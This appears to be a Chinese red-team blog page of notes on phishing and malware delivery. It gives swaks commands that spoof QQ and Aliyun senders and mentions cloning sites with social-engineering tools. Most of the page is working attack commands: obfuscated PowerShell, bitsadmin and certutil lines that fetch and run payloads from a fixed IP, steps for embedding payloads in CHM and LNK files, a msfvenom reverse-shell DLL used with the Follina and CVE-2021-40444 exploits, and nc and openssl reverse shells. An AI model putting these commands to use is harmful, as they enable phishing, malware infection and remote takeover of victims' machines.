&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;临时邮箱:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://24mail.chacuo.net/ https://www.linshi-email.com/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检测:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nslookup -type=txt xxx.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;伪造：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swaks --header-X-Mailer &amp;quot;&amp;quot; --header-Message-Id &amp;quot;&amp;quot; --header-&amp;quot;Content-Type&amp;quot;=&amp;quot;text/html&amp;quot; --from &amp;quot;QQ管理&amp;lt;admin@qq.com&amp;gt;&amp;quot; --ehlo shabimeiguo -head&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;er &amp;quot;Subject: 测试&amp;quot; --body 我们做了一个测试 --to owazmoffth@iubridge.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 2 ）有 SPF 直接伪造 - Swaks&lt;br&gt;
 工具地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2pldG1vcmUub3JnL2pvaG4vY29kZS9zd2Frcy8=&#34;&gt;http://jetmore.org/john/code/swaks/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;软刚发信人：（修改字眼）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swaks --body &amp;quot;test&amp;quot; --header &amp;quot;Subject:testT&amp;quot; -t xx@163.com -f system@notice.aliyun.com.cn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;硬刚发信人：（转发突破）注册一个邮箱开启POP3转发、使用网上已知的邮箱系统。将要发送的邮件导出EML模版，修改内置的发件人内容时间等。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swaks --to 收信人 -f 发信人 --data 1.eml --server smtp.163.com -p 25 -au 帐号 -ap 授权码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;自建要伪造高仿的邮箱系统、使用第三方平台或自行搭建、设置 SPF，中转平台突破。&lt;br&gt;
smtp2go（速度慢但免费发送量大）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc210cDJnby5jb20v&#34;&gt;https://www.smtp2go.com/&lt;/span&gt;&lt;br&gt;
SendCloud（速度快但免费发送量少）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VuZGNsb3VkLm5ldC8=&#34;&gt;https://www.sendcloud.net/&lt;/span&gt;&lt;br&gt;
 也可以自己搭建邮件服务器 - Ewomail&amp;amp;Postfix：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ld29tYWlsLmNvbS8=&#34;&gt;http://www.ewomail.com/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 3 ）采用自己搭建 Ewomail 配合 Swaks&lt;br&gt;
 转发地址域名由你指定注册、不受限于其他系统的限制和风控&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RvYy5ld29tYWlsLmNvbS9kb2NzL2V3b21haWwvamlhbmppZQ==&#34;&gt; http://doc.ewomail.com/docs/ewomail/jianjie&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI4NjY1MzIvYXJ0aWNsZS9kZXRhaWxzLzEyMzMzNTUyOQ==&#34;&gt;https://blog.csdn.net/u012866532/article/details/123335529&lt;/span&gt;&lt;br&gt;
swaks --to &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOjQ3MTY1NjgxNEBxcS5jb20=&#34;&gt;471656814@qq.com&lt;/span&gt; -f &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmFkbWluQGExaXl1bi5jb20=&#34;&gt;admin@a1iyun.com&lt;/span&gt; --data test.eml --server &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NtdHAuYTFpeXVuLmNvbQ==&#34;&gt;smtp.a1iyun.com&lt;/span&gt; -p 25 -au &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmFkbWluQGExaXl1bi5jb20=&#34;&gt;admin@a1iyun.com&lt;/span&gt; -ap xiaodi123&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;网页钓鱼&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;克隆：手工另存为、Setoolkit、Goblin&lt;br&gt;
 工具地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3hpZWNhdC9nb2JsaW4=&#34;&gt;https://github.com/xiecat/goblin&lt;/span&gt;&lt;br&gt;
 项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RydXN0ZWRzZWMvc29jaWFsLWVuZ2luZWVyLXRvb2xraXQ=&#34;&gt;https://github.com/trustedsec/social-engineer-toolkit&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;宏病毒&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#宏病毒&#34;&gt;#&lt;/a&gt; 宏病毒&lt;/h4&gt;
&lt;p&gt;生成宏病毒：Attacks --&amp;gt; Packages --&amp;gt; MS offices Macro&lt;/p&gt;
&lt;p&gt;操作：Office 格式文档文件钓鱼一般采用宏或对象触发后门；默认 Office 加载宏后一般需要启用内容才可调用执行；所以诱惑伪装很重要。&lt;/p&gt;
&lt;p&gt;伪装：提示需要启用内容才能查看文件内容，并设置限制编辑等&lt;/p&gt;
&lt;p&gt;文件内容模式：docx-doc&amp;amp;docm、xlsx-xls&amp;amp;xlsm、pptx-ppt&amp;amp;pptm&lt;/p&gt;
&lt;p&gt;老版本： 97 - 2003 0ffice 默认是支持宏代码运行&lt;/p&gt;
&lt;p&gt;新版本：启动宏的格式，一般就是在后缀加上 M&lt;/p&gt;
&lt;h4 id=&#34;chm-电子书&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chm-电子书&#34;&gt;#&lt;/a&gt; CHM 电子书&lt;/h4&gt;
&lt;p&gt;CS 生成上线：Attacks——&amp;gt;Web Drive by——&amp;gt;Scripted web Delivery&lt;/p&gt;
&lt;p&gt;CHM 伪装：找一个正常的 CHM 电子书，解压后；将 Payload 插入其中某个或整个页面；加载编译，当电子书打开修改页面后上线。&lt;/p&gt;
&lt;p&gt;解压命令：hh -decompile .\html xx.CHM&lt;/p&gt;
&lt;p&gt;木马执行：使用 bitsadmin 或 Powershell 模式加载木马&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;免杀方案&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell.exe -nop -w hidden -c &amp;quot;IEX ((new-object net.webclient).downloadstring(&amp;#x27;http://47.94.236.117:84/a&amp;#x27;))&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bitsadmin /transfer 604c http://47.94.236.117:83/a %APPDATA%\604c.exe&amp;amp;% APPDATA%\604c.exe&amp;amp;del %APPDATA%\604c.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;c&amp;quot;&amp;quot;e&amp;quot;&amp;quot;r&amp;quot;&amp;quot;t&amp;quot;&amp;quot;u&amp;quot;&amp;quot;t&amp;quot;&amp;quot;i&amp;quot;&amp;quot;l&amp;quot; -&amp;quot;u&amp;quot;&amp;quot;r&amp;quot;&amp;quot;l&amp;quot;&amp;quot;c&amp;quot;&amp;quot;a&amp;quot;&amp;quot;c&amp;quot;&amp;quot;h&amp;quot;&amp;quot;e&amp;quot; -split -f [http://47.94.236.117](http://47.94.236.117)/5.exe c:/5.exe &amp;amp; c:/5.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell -NoExit &amp;quot;$c1=&amp;#x27;IEX(New-Object Net.WebClient).Downlo&amp;#x27;;$c2=&amp;#x27;123(&amp;#x27;&amp;#x27;http://47.94.236.117:84/a&amp;#x27;&amp;#x27;)&amp;#x27;.Replace(&amp;#x27;123&amp;#x27;,&amp;#x27;adString&amp;#x27;);IEX ($c1+$c2)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.exe &amp;amp;&amp;amp; .\bypass.exe &amp;quot;$a=&amp;#x27;IEX((New-Object Net.WebClient).DownloadString(&amp;#x27;&amp;#x27;ht&amp;#x27;;$b=&amp;#x27;tp://xxx/hr.ps1&amp;#x27;&amp;#x27;));&amp;#x27;;IEX ($a+$b)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;lnk-快捷方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lnk-快捷方式&#34;&gt;#&lt;/a&gt; LNK 快捷方式&lt;/h4&gt;
&lt;p&gt;生成：Attacks -&amp;gt; Packages -&amp;gt; Html Application&lt;/p&gt;
&lt;p&gt;上传：Attacks——&amp;gt;Web Drive by——&amp;gt;Host file&lt;/p&gt;
&lt;p&gt;执行：C:\Windows\System32\mshta.exe &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3h4Lnh4Lnh4Lnh4&#34;&gt;http://xx.xx.xx.xx&lt;/span&gt;:xx/x.ext&lt;/p&gt;
&lt;p&gt;伪装：创建快捷方式、生成 HTA 并上传、属性更改目标执行、属性更改图标伪装&lt;/p&gt;
&lt;p&gt;lnk 免杀思路：powershell 混淆、shellcode 混淆、vba 混淆&lt;/p&gt;
&lt;h4 id=&#34;office-cve漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#office-cve漏洞&#34;&gt;#&lt;/a&gt; Office CVE 漏洞&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Microsoft MSDT CVE-2022-30190 代码执行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;工具地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYQ==&#34;&gt;https://github.com/JohnHammond/msdt-follina&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;该漏洞首次发现在 2022 年 5 月 27 日，由白俄罗斯的一个 IP 地址上传。恶 意文档从 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，通过 ms-ms dt MSProtocol URI 方法来执行恶意 PowerShell 代码。感染过程利用程序 msdt.e xe，该程序用于运行各种疑难解答程序包。&lt;/p&gt;
&lt;p&gt;此工具的恶意文档无需用户交互即可调用它。导致在宏被禁用的情况下， 恶意文档依旧可以使用 ms-msdt URI 执行任意 PowerShell 代码。&lt;/p&gt;
&lt;p&gt;目前已知影响的版本为:office 2021 Lts、office 2019、office 2016、Offic e 2013、Office ProPlus、Office 365&lt;/p&gt;
&lt;p&gt;测试：msdt.exe/id PCWDiagnostic /skip force /param “IT_RebrowseForFile=? I T_LaunchMethod=ContextMenu IT_BrowseForFile=&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;(Invoke-Expression(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;(Invoke- Expression(’[System.Text.Encoding]’+[char]58+[char]58+‘Unicode.GetString([Syste m.Convert]’+[char]58+[char]58+‘FromBase64String(’+[char]34+‘YwBhAGwAYwA=’ +[char]34+’))’))))i/…/…/…/…/…/…/…/…/…/…/…/…/…/…/Windows/System32/mpsigstub.exe”&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Microsoft MSHTML CVE- 2021 - 40444 远程代码执行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;工具地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xvY2tlZGJ5dGUvQ1ZFLTIwMjEtNDA0NDQ=&#34;&gt;https://github.com/lockedbyte/CVE-2021-40444&lt;/span&gt;&lt;br&gt;
 影响版本：office 2003 office 2007 office 2010 office 2013 office 2016&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装依赖&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt-get install lcab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成DLL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117lport=9999 -f dll &amp;gt; shell.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听上线&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 9999&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成文档&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp shell.dll CVE- 2021 - 40444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 exploit.py generate shell.dll http://47.94.236.117:10000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听文档&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 exploit.py host 10000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;钓鱼伪装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#钓鱼伪装&#34;&gt;#&lt;/a&gt; 钓鱼伪装&lt;/h4&gt;
&lt;p&gt;（ 1 ）文件后缀 - 钓鱼伪装 - RLO&lt;/p&gt;
&lt;p&gt;通过修改文件后缀的编码方式，将 exe 后缀文件伪装为 jpg 文件&lt;/p&gt;
&lt;p&gt;（ 2 ）压缩文件 - 自解压 - 释放执行&lt;/p&gt;
&lt;p&gt;Winrar 压缩软件，设置压缩为自启动，双击压缩文件之后即释放木马&lt;/p&gt;
&lt;p&gt;（ 3 ）捆绑文件 - 打包加载 - 释放执行&lt;/p&gt;
&lt;p&gt;通过不同的捆绑释放器进行绑定免杀木马，执行文件后释放木马&lt;/p&gt;
&lt;h4 id=&#34;nc-流量加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nc-流量加密&#34;&gt;#&lt;/a&gt; NC 流量加密&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;nc 使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 5566&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -e /bin/bash 47.94.236.117 5566&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在我们的攻击端生成自签名证书：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在攻击机上监听指定端口，这里我选择 8888 ：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 8888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在受害机上执行shell反弹命令(注意修改ip和端口)：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkfifo /tmp/s; /bin/sh -i &amp;lt; /tmp/s 2&amp;gt;&amp;amp;1 | openssl s_client -quiet -connect 47.94.236.117:8888 &amp;gt; /tmp/s;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;msf-通讯特征修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf-通讯特征修改&#34;&gt;#&lt;/a&gt; MSF 通讯特征修改&lt;/h4&gt;
&lt;p&gt;解决 HTTPS-SSL 通讯证书被特征标示问题&lt;/p&gt;
